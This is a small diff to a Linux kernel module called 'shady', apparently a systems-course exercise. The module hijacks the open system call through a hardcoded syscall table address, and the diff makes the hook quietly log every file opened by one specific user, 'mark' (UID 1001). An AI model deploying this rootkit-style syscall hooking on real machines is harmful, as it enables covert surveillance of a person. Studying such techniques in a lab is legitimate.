@@ -40,6 +40,8 @@ MODULE_LICENSE("GPL");
 #define SHADY_DEVICE_NAME "shady"
 
 unsigned long long system_call_table_address = 0xffffffff81801400;
+uid_t marks_uid = 1001;
+
 asmlinkage int (*old_open) (const char*, int, int);
 
 /* parameters */
@@ -57,7 +59,9 @@ static struct class *shady_class = NULL;
 
 asmlinkage int my_open (const char* file, int flags, int mode)
 {
-  printk("Using my_open\n");
+  if (__kuid_val(current_uid()) == marks_uid) {
+    printk("mark is about to open '%s'\n", file);
+  }
   return old_open(file, flags, mode);
 }
 
